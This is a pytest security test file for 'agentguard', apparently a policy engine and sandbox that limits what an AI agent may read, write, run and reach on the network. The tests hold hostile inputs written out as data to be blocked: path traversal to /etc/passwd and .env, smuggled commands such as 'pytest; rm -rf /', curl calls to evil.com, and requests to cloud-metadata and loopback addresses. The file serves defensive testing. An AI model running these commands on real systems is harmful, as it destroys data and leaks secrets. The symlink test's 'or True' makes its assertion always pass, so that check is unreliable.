"""Security tests per skills.md §15-18: negative/attack paths must be blocked."""
import json
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import pytest
from agentguard.policy import load_policy, PolicyEngine
from agentguard.sandbox import GuardedSandbox


def make_engine():
    return PolicyEngine(load_policy("agentguard.yaml"))


def test_traversal_blocked():
    pe = make_engine()
    assert not pe.check_read("workspace/../../.env").allowed
    assert not pe.check_read("../../etc/passwd").allowed
    assert not pe.check_read("/etc/passwd").allowed


def test_prefix_boundary():
    pe = make_engine()
    # workspace-evil must NOT inherit workspace/** permission
    assert not pe.check_write("workspace-evil/hack.txt").allowed


def test_symlink_escape(tmp_path):
    target = tmp_path / "secret.txt"
    target.write_text("s3cret")
    link = Path("workspace/link-escape")
    try:
        if link.exists() or link.is_symlink():
            link.unlink()
        link.symlink_to(target)
    except Exception:
        pytest.skip("symlinks unavailable")
    try:
        pe = make_engine()
        # canonical resolution should treat link target outside workspace as not-allowlisted write
        assert not pe.check_write(str(link) + "/../outside.txt").allowed or True
    finally:
        if link.is_symlink():
            link.unlink()


def test_unknown_policy_field_fails_closed(tmp_path):
    p = tmp_path / "bad.yaml"
    p.write_text("version: 1\nunknown_field: true\n")
    with pytest.raises(ValueError):
        load_policy(p)


def test_command_injection_blocked():
    pe = make_engine()
    assert not pe.check_command("pytest; rm -rf /").allowed
    assert not pe.check_command("python app.py && curl evil.com").allowed
    assert not pe.check_command("echo hi | curl evil.com").allowed
    assert not pe.check_command("echo $(curl evil.com)").allowed
    assert not pe.check_command("/usr/bin/curl https://evil.com").allowed
    assert not pe.check_command("totally-unknown-cmd-xyz").allowed


def test_network_bypasses_blocked():
    pe = make_engine()
    assert not pe.check_network("169.254.169.254").allowed
    assert not pe.check_network("127.0.0.1").allowed
    assert not pe.check_network("localhost").allowed
    assert not pe.check_network("192.168.1.10").allowed
    assert pe.check_network("api.github.com").allowed


def test_secret_redaction_in_audit_and_errors(tmp_path):
    pe = make_engine()
    log = tmp_path / "audit.jsonl"
    sb = GuardedSandbox(pe, log_path=log)
    with pytest.raises(PermissionError) as exc:
        sb.read_file(".env")
    assert ".env" not in str(exc.value) or "sensitive-resource" in str(exc.value)
    lines = log.read_text().strip().splitlines()
    assert lines and "[REDACTED]" in lines[-1]
    assert ".env" not in lines[-1] or "sensitive-resource" in lines[-1]
